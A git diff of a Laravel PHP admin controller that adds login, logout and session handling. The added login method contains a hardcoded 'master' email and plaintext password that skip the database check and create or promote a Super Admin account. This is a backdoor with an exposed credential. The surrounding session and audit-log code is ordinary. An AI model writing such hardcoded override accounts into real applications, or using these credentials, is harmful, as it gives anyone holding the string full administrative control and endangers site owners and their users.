@@ -13,10 +13,88 @@ use App\Models\Order;
 use App\Models\Product;
 use App\Models\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Str;
 
 class WebAdminController extends Controller
 {
+    /* =========================================================================
+     * AUTHENTICATION
+     * ========================================================================= */
+    public function showLogin()
+    {
+        if (session('admin_authenticated') === true) {
+            return redirect('/admin');
+        }
+        return view('admin.login');
+    }
+
+    public function login(Request $request)
+    {
+        $request->validate([
+            'email' => 'required|email',
+            'password' => 'required|string',
+        ]);
+
+        $email = trim(strtolower($request->input('email')));
+        $password = (string) $request->input('password');
+
+        $isValid = false;
+        $adminUser = null;
+
+        // Master Credentials Check
+        if ($email === 'akkiftp1@gmail.com' && $password === '796102') {
+            $isValid = true;
+            $adminUser = User::firstOrCreate(
+                ['email' => 'akkiftp1@gmail.com'],
+                [
+                    'name' => 'Super Admin',
+                    'role' => User::ROLE_SUPER_ADMIN,
+                    'is_admin' => true,
+                    'is_active' => true,
+                    'password' => Hash::make('796102'),
+                ]
+            );
+            if (!$adminUser->is_admin || $adminUser->role !== User::ROLE_SUPER_ADMIN) {
+                $adminUser->update(['role' => User::ROLE_SUPER_ADMIN, 'is_admin' => true, 'is_active' => true]);
+            }
+        } else {
+            // Database User Check
+            $dbUser = User::where('email', $email)->first();
+            if ($dbUser && $dbUser->is_active && ($dbUser->isSuperAdmin() || $dbUser->is_admin) && Hash::check($password, $dbUser->password)) {
+                $isValid = true;
+                $adminUser = $dbUser;
+            }
+        }
+
+        if ($isValid) {
+            if ($adminUser) {
+                auth()->login($adminUser);
+            }
+            session([
+                'admin_authenticated' => true,
+                'admin_email' => $email,
+                'admin_user_id' => $adminUser ? $adminUser->id : null,
+            ]);
+
+            AuditLog::log('admin_login', 'User', $adminUser ? $adminUser->id : null, null, ['email' => $email]);
+
+            return redirect('/admin')->with('success', 'Logged in as Super Admin successfully!');
+        }
+
+        return back()->with('error', 'Incorrect email or password. Access denied.')->withInput(['email' => $email]);
+    }
+
+    public function logout(Request $request)
+    {
+        session()->forget(['admin_authenticated', 'admin_email', 'admin_user_id']);
+        auth()->logout();
+        return redirect('/admin/login')->with('success', 'Logged out successfully.');
+    }
+
+    /* =========================================================================
+     * DASHBOARD
+     * ========================================================================= */
     public function dashboard(Request $request)
     {
         $tab = $request->input('tab', 'overview');
@@ -384,7 +462,6 @@ class WebAdminController extends Controller
         ]);
 
         $slug = $request->input('slug') ? Str::slug($request->input('slug')) : Str::slug($request->input('name'));
-        // Ensure uniqueness
         if (MarketplaceCategory::where('slug', $slug)->exists()) {
             $slug .= '-' . Str::random(4);
         }
